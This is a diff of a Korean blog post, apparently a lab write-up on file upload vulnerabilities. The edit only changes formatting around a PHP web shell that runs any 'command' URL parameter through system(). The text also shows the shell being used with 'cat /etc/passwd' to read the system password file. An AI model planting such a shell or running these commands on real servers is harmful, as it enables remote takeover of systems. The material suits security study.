@@ -15,13 +15,15 @@
       * test.txt파일을 업로드 하면 위의 사진과 같이 해당 파일이 업로드된 서버 내부 디렉토리가 반환된다. 해당 위치를 참조하여 test.txt파일에 연결하면 아래 사진과 같이 test.txt의 내용이 출력되는 것을 알 수 있다. 서버 역할을 하는 컴퓨터 내부 문서를 웹페이지라고 하는 것을 생각해보면 대상 시스템에 'test'라는 텍스트가 보이는 웹 페이지를 업로드 한 것으로 생각할 수 있다.
       <img src="/assets/230623/230623_screenshot_2.png" width="100%" height="100%" alt="Screenshot_of_uploaded_file"><br/><br/>
       * 이에 업로드 할 파일을 일반적인 텍스트파일이 아닌 스크립트 언어로 제작된 웹쉘로 선택한다면, 다른 부가적인 동작을 유도할 수 있을 것으로 생각된다. 그래서 다음과 같은 코드의 웹쉘을 하나 만들었다.     
-      ```PHP
+      <pre>
+      <code>
         <?php
-        $cmd = $_GET['command'];
-        if(isset($cmd))
-        system($cmd);
+          $cmd = $_GET['command'];
+          if(isset($cmd))
+          system($cmd);
         ?>
-      ```
+      </code>
+      </pre>
       * 해당 웹쉘은 PHP를 기반으로 하고 있으며, 'command'를 인자로 전달받아 'cmd'라는 변수를 생성하고, 'cmd'의 값이 설정되어 있다면(isset()으로 확인) system()함수를 이용하여 CL(Command Line)명령어로 전달하여 실행시킨다. 이에 기반해 해당 PHP파일을 업로드 한 뒤, command의 값을 'cat /etc/passwd'로 하여 해당 경로에 접속하면 다음과 같이 CLI에서 'cat /etc/passwd'명령을 실행한 것과 같은 결과를 얻을 수 있다.
       <img src="/assets/230623/230623_screenshot_4.png" width="100%" height="100%" alt="Screenshot_of_webshell_upload_result"><br/><br/>
 
